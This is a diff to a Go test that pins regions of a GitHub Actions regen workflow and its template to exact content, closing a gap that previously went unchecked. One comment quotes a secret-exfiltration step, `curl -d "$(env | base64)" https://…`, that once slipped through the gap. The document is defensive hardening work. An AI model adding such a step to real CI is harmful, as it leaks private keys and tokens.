@@ -1,8 +1,10 @@
 package templates
 
 import (
+	"fmt"
 	"os"
 	"path/filepath"
+	"regexp"
 	"strings"
 	"testing"
 )
@@ -682,8 +684,19 @@ func repoRootFromCaller(t *testing.T) string {
 //     `./bin/logmind`) so its own CI always exercises the code under
 //     review, never a stale release.
 //
+// "May differ" is not "is unchecked", and the distinction is the whole
+// lesson of the v11 divergence. Every one of the four is pinned to its own
+// content: (1) is a required prefix, (2) is substituted before comparing so
+// it costs no divergence at all, (3) is parsed key-by-key by
+// requireAppCredentialEnvBlock, and (4) is pinned as two whole literals
+// (wantTemplateBuildStanza / wantWorkflowBuildStanza). There is no region
+// of either file whose content nothing reads — an added step, an added
+// `env:`, a redirected output path, all fail here. A gap in this test is
+// not a gap in coverage; it is the only place in the repo where a workflow
+// step is under no scrutiny at all.
+//
 // Everything else — the header, the check-derived-docs job (the actual
-// PR-blocking enforcement logic), the checkout stanza, and the whole
+// enforcement logic), the checkout stanza, the regen step, and the whole
 // credential mechanism through EOF — must be byte-identical, or logmind's
 // own CI would be exercising different behaviour than what every other
 // repo installs.
@@ -731,6 +744,7 @@ func TestRegenTimelineWorkflow_LockstepWithTemplate(t *testing.T) {
 		jobAnchor    = "\n  regen-on-main:\n"
 		envAnchor    = "\n    env:\n"
 		stepsAnchor  = "\n    steps:\n"
+		regenAnchor  = "\n      - name: Regenerate derived docs\n"
 		buildEnd     = "\n      # Rung 1: mint a short-lived (1 hour) App installation token"
 		checkoutTail = "\n          persist-credentials: false\n"
 	)
@@ -760,16 +774,100 @@ func TestRegenTimelineWorkflow_LockstepWithTemplate(t *testing.T) {
 	wfD, wfRest := splitOnceOrFail(t, "installed workflow", wfRest, checkoutTail)
 	requireIdentical(t, "regen-on-main checkout stanza", stepsAnchor+tmplD, stepsAnchor+wfD)
 
-	// --- Region E (difference 3): the build mechanism. Free to diverge —
-	// but each side must still be the mechanism it claims to be, or a
-	// silent swap here would go unnoticed.
-	_, tmplRest = splitOnceOrFail(t, "template", tmplRest, buildEnd)
-	_, wfRest = splitOnceOrFail(t, "installed workflow", wfRest, buildEnd)
+	// --- Region E1 (difference 4): how each side OBTAINS the logmind binary.
+	//
+	// This is the only region where the two files genuinely run different
+	// mechanisms, and it used to be the one region where NOTHING was
+	// checked: both halves were discarded, so any content at all could sit
+	// in the gap. Two things went through it with the whole suite green — a
+	// step running `curl -d "$(env | base64)" https://…` (the job `env` two
+	// regions up holds APP_PRIVATE_KEY), and a regen redirected to /tmp,
+	// which makes the push step report "already current" forever. That is
+	// the same unanchored-gap defect that let the credential divergence
+	// ship, which is what this test was written to stop.
+	//
+	// So each side is now pinned to its WHOLE content: "free to diverge"
+	// means "free to be the other mechanism", never "unchecked". Only the
+	// action's version ref is normalised — `actions/setup-go@v7` vs `@v8` is
+	// still "install Go", while swapping the action itself is not.
+	tmplE1, tmplRest := splitOnceOrFail(t, "template", tmplRest, regenAnchor)
+	wfE1, wfRest := splitOnceOrFail(t, "installed workflow", wfRest, regenAnchor)
+	requireExactly(t, "the template's build mechanism (a released binary via setup-logmind)",
+		wantTemplateBuildStanza, normalizeActionRefs(tmplE1))
+	requireExactly(t, "the installed workflow's build mechanism (this repo's own source)",
+		wantWorkflowBuildStanza, normalizeActionRefs(wfE1))
+
+	// --- Region E2: the regen step. NOT part of the permitted divergence —
+	// both sides run the same two subcommands against the same two paths,
+	// and only the binary they invoke differs (a PATH lookup vs the freshly
+	// built ./bin/logmind). Pinned as whole content on each side rather than
+	// diffed against the other, so neither the paths nor the flags can move
+	// on one side alone.
+	tmplE2, tmplRest := splitOnceOrFail(t, "template", tmplRest, buildEnd)
+	wfE2, wfRest := splitOnceOrFail(t, "installed workflow", wfRest, buildEnd)
+	requireExactly(t, "the template's regen step", fmt.Sprintf(wantRegenStep, "logmind"), tmplE2)
+	requireExactly(t, "the installed workflow's regen step", fmt.Sprintf(wantRegenStep, "./bin/logmind"), wfE2)
 
 	// --- Region F: the credential mechanism, through EOF. THE region this
 	// test exists for. Byte-identical.
 	requireIdentical(t, "regen-on-main credential mechanism (App token → PAT → GITHUB_TOKEN, and the push)",
 		buildEnd+tmplRest, buildEnd+wfRest)
+}
+
+// The two build stanzas, in full. These are the ONLY bytes either file is
+// allowed to carry between the checkout and the regen step — the region
+// that used to be discarded unchecked.
+//
+// A consumer repo installs a RELEASED logmind; this repo builds its own
+// in-tree source so its CI always exercises the code under review. That is
+// the whole of the difference, and stating it as two literals is what makes
+// anything else — an extra step, an added `env:`, a `run:` that was not
+// there — a failure rather than a silence.
+const (
+	wantTemplateBuildStanza = `      - uses: thrillmade/setup-logmind@<ref>
+        with:
+          token: ${{ github.token }}`
+
+	wantWorkflowBuildStanza = `      - uses: actions/setup-go@<ref>
+        with:
+          go-version: "1.22"
+          cache: true
+      - name: Build logmind from source
+        run: make build`
+
+	// wantRegenStep takes the binary each side invokes. Everything else —
+	// the subcommands, the flags, the OUTPUT PATHS — is common, and a regen
+	// pointed anywhere but docs/ is a job that reports "already current"
+	// forever while the derived docs rot.
+	wantRegenStep = `        run: |
+          set -euo pipefail
+          %[1]s timeline --write docs/timeline.md
+          %[1]s file-structure --write docs/file-structure.md`
+)
+
+// actionRefPattern matches the version ref of a `uses:` line so a
+// dependabot bump is not read as mechanism drift. The ACTION is pinned; its
+// tag is not.
+var actionRefPattern = regexp.MustCompile(`(uses: [A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+)@\S+`)
+
+func normalizeActionRefs(s string) string {
+	return actionRefPattern.ReplaceAllString(s, "${1}@<ref>")
+}
+
+// requireExactly fails when a region is not byte-for-byte the content it is
+// pinned to. Unlike requireIdentical (which compares the two files against
+// each other) this compares ONE side against a literal, which is what a
+// region the two files are allowed to differ in needs: there is no other
+// copy to diff it against.
+func requireExactly(t *testing.T, region, want, got string) {
+	t.Helper()
+	if want == got {
+		return
+	}
+	t.Errorf("regen-timeline.yml: %s is not what it claims to be. This region is where the two "+
+		"copies of this workflow are permitted to differ, so nothing else checks it — content that "+
+		"appears here appears NOWHERE else in the suite.\n--- want ---\n%s\n--- got ---\n%s",
+		region, want, got)
 }
 
 // splitOnceOrFail cuts body at sep, requiring sep to appear EXACTLY once.
